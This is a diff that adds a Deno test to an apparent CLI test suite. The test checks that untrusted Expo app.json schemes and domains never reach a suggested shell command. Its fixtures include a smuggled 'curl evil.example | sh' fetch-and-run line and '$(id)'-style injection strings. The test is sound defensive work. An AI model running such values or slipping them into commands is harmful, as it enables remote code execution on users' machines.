@@ -553,6 +553,38 @@ const NO_CONFIG = {
   notes: [],
 };
 
+Deno.test("expoMobilePlan: an app config's scheme or domain never reaches the suggested command unless it is one", () => {
+  // Someone else's repo: app.json's scheme / associatedDomains are copied into a command the
+  // user pastes into a shell, so a hostile one would run there.
+  const hostile = "app; curl evil.example | sh";
+  const plan = expoMobilePlan({ expo: "1" }, {
+    ...NO_CONFIG,
+    schemes: ["myapp", hostile, "$(id)"],
+    linkDomains: ["example.com", "*.example.com", "x.com`id`"],
+  });
+  const command = plan.command ?? "";
+  assertEquals(
+    command,
+    "denext mobile add deep-links --scheme myapp --domain example.com --domain '*.example.com'",
+  );
+  for (const bad of [hostile, "$(id)", "`id`", ";", "|"]) {
+    assert(!command.includes(bad), `${bad} stays out of the command`);
+  }
+  // What was left out is a manual item, shown quoted (never run).
+  assertEquals(plan.manualLinks.length, 3);
+  assertStringIncludes(plan.manualLinks[0], JSON.stringify(hostile));
+  assertStringIncludes(plan.manualLinks[0], "not a URL scheme");
+  assertStringIncludes(plan.manualLinks[2], JSON.stringify("x.com`id`"));
+  // The migrate report and `--check` list them; the CLI prints them quoted.
+  assert(plan.manualLinks.every((m) => !m.includes("\n")));
+  // Every scheme invalid: the placeholder, not the value.
+  const only = expoMobilePlan({ expo: "1", "expo-auth-session": "1" }, {
+    ...NO_CONFIG,
+    schemes: [hostile],
+  });
+  assertEquals(only.command, "denext mobile add deep-links auth-session --scheme <scheme>");
+});
+
 Deno.test("expoMobilePlan: the newly shimmed Expo packages and community aliases map to capabilities", () => {
   const plan = expoMobilePlan(
     {
